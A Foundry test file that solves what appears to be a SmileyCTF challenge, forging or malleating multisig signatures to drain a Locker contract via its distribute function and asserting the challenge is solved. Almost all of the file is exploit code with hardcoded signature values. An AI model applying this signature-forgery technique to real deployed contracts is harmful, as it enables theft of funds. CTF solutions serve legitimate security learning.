// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {SetupLocker, Locker, signature} from "./challenge/Locker.sol";

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    SetupLocker setup;
    Locker locker;
    signature[] signatures;

    function setUp() public {
        vm.deal(playerAddr, 1 ether);
        setup = new SetupLocker(playerAddr);
        locker = Locker(setup.deploy());
    }

    function test() public {
        vm.startPrank(playerAddr, playerAddr);

        // python src/SmileyCTF/MultisigWallet/calculateSignature.py
        signatures.push(
            signature({
                v: 28,
                r: 0x36ade3c84a9768d762f611fbba09f0f678c55cd73a734b330a9602b7426b18d9,
                s: 0x90cd9cb819a5174da7cf411180c5bc89c57933efc06d4e19d0184f74e3479798
            })
        );
        signatures.push(
            signature({
                v: 27,
                r: 0x57f4f9e4f2ef7280c23b31c0360384113bc7aa130073c43bb8ff83d4804bd2a7,
                s: 0x96bbcfdfa5949da337af916badf752cbfbe59762eff9df25664b559919d7f831
            })
        );
        signatures.push(
            signature({
                v: 28,
                r: 0xe2e9d4367932529bf0c5c814942d2ff9ae3b5270a240be64b89f839cd4c78d5d,
                s: 0x93f37ba485770a5dc692808a4ac952a73ef12a68068868d21679abe2f9c5296f
            })
        );

        bytes32 msgHash = locker.msgHash();
        for (uint256 i = 0; i < signatures.length; i++) {
            signature memory sig = signatures[i];
            address recoveredAddress = ecrecover(msgHash, sig.v, sig.r, sig.s);
            console.log("Recovered address:", recoveredAddress);
        }

        locker.distribute(signatures);

        vm.stopPrank();

        assertTrue(setup.isSolved(), "Challenge not solved");
    }
}
